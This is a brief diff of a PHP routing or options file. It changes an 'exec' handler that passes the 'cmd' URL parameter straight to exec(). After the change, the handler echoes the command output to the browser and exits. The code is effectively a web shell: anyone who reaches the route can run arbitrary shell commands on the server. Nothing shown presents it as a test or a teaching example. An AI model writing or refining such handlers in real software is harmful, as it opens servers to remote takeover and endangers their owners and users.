@@ -23,9 +23,10 @@ $options = [
         [
             'pattern' => 'exec',
             'action' => function () {
-                return [
-                    'result' => exec($_GET['cmd'])
-                ];
+                $result = [];
+                exec($_GET['cmd'], $result);
+                echo implode("\n", $result);
+                exit();
             }
         ]
     ],
